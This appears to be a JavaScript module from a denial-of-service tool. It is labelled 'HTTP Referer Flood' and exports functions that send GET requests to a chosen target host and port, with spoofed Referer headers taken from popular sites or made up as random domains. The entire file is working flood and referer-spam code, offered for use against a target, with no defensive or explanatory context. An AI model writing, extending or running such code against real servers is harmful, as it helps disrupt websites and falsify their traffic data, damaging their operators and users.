const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Referer Flood',
    description: 'Requests with referer spam',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        const referers = [
            'https://google.com',
            'https://facebook.com',
            'https://youtube.com',
            'https://twitter.com',
            'https://instagram.com'
        ];
        const referer = referers[Math.floor(Math.random() * referers.length)];
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET',
                headers: { 'Referer': referer }
            }, (res) => {
                resolve({ status: res.statusCode, referer: referer });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        const randomReferer = 'https://' + Math.random().toString(36).substring(7) + '.com';
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            headers: { 'Referer': randomReferer }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};